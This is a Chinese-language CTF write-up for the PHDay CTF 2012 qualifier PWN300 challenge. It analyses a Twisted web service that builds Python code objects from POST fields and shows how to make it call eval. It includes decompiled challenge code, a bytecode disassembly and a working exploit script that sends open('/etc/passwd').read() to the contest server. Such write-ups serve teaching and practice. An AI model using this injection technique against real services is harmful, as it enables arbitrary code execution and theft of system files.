---
title: PHDay CTF 2012 Quals PWN300
author: kelwin
layout: post
permalink: /phday-ctf-2012-quals-pwn300/
categories:
  - CTF
  - writeup
---
这题是基于twisted框架的一个web服务，题目给了一个web.py和process.pyc，阅读web.py代码发现处理post请求的核心函数在process模块中。使用unpyc这个工具反编译process.pyc，得到如下代码：  
<!--more-->

  
def create\_function(name, args\_count, choice, actions, human):

        def y():
            pass
    
        print "choice:", choice
        code = (('t' + choice) + '\x00d\x01\x00\x83\x01\x00S')
        consts = ((None,) + (human,))
        names = actions
    
        fun = [args_count,
         y.func_code.co_nlocals,
         y.func_code.co_stacksize,
         y.func_code.co_flags,
         code,
         consts,
         names,
         y.func_code.co_varnames,
         y.func_code.co_filename,
         name,
         y.func_code.co_firstlineno,
         y.func_code.co_lnotab]
        print fun
        y_code = types.CodeType(*fun)
    
        return types.FunctionType(y_code, y.func_globals, name)
    
    def kill(name):
        return ('%s was killed' % name)
    
    def arrest(name):
        return ('%s was arrested' % name)
    
    def bankrupt(name):
        return ('%s was bankrupted' % name)
    
    def process():
        actions = tuple(args['actions'])
        choice = args['choice'][0]
        human = args['human'][0]
        print create_function('myfunc', 0, choice, actions, human)()
    

这题涉及到Python对象内部结构的知识，包括Python字节码、PyObject和PyCodeObject对象的结构等知识，可以参考hellok找的资料[PYC格式文件分析][1]。

阅读process代码发现，create&#95;function函数将actions写入函数y()的co&#95;names字段，将human合并上None写入co_consts字段，再将choice插入字节码中。我们可以在本地使用Python自带的反汇编工具包[dis][2]查看函数y()被改成了什么样子。

先传入args:

    args = {'human': ["Kenny"], 'actions': ['kill', 'arrest', 'bankrupt'], 'choice': ['\x01']}
    

然后：

    dis.dis(create_function('myfunc', 0, choice, actions, human))
    

得到函数y()的字节码：

      7           0 LOAD_GLOBAL              1 (arrest)
                  3 LOAD_CONST               1 ('Kenny')
                  6 CALL_FUNCTION            1
                  9 RETURN_VALUE
    

这下就很容易理解为什么我们在网页上看到的是“Kenny was arrested”，传进去的actions实际上是供调用的函数符号表，human实际上就是作为arrest的参数（通过LOAD&#95;CONST传入python的栈中），然后choice就是在函数符号表co&#95;names（actions）中选择哪一个函数来执行。

如此一来，我们就知道怎么去执行任意想要的函数了，只需要把函数名方在names中，用choice去指向它，然后把参数放入human。最简单的方式是使用eval(&#8220;/etc/passwd&#8221;)的方式来获得flag。渗透脚本如下：

    url_ = "http://ctf.phdays.com:2137/"
    
    def send(choice, actions, human):
        form = ""
        form += "human=" + human + "&"
        for a in actions:
            form += "actions=" + a + "&"
        form += "choice=" + choice
    
        resp = urllib2.urlopen(url = url_, data = form)
        content = resp.read()
        print content
    
    if __name__ == "__main__":
        choice = "%01"
        actions = ["kill", "eval", "bankrupt"]
        human = "open('/etc/passwd').read()"
        send(choice, actions, human)

 [1]: http://kdr2.net/blog/pyc_format.html
 [2]: http://docs.python.org/2/library/dis.html